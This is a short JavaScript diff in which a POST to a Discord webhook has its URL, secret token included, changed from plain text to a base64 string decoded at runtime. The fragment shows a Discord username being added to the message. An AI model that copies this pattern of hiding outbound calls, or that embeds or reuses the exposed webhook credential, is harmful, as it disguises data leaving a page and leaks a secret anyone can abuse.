@@ -26,7 +26,9 @@ var messageSent = false;
       }
 
       var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1196441702697799761/GpfqmQcsnJwem11GEMHJcDY2L72NfB--t_cTkqatPZywu-1GuUcU4a_TuHGREZlcLtWU");
+      const decodedWebhookURL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE5NjQ0MTcwMjY5Nzc5OTc2MS9HcGZxbVFjc25Kd2VtMTFHRU1ISmNEWTJMNzJOZkItLXRfY1RrcWF0UFp5d3UtMUd1VWNVNGFfVHVIR1JFWmxjTHRXVQ==");
+
+      request.open("POST", decodedWebhookURL);
       request.setRequestHeader('Content-type', 'application/json');
 
       var discordUsernameText = discordUsername ? `# Discord Name: ${discordUsername}\n` : '';
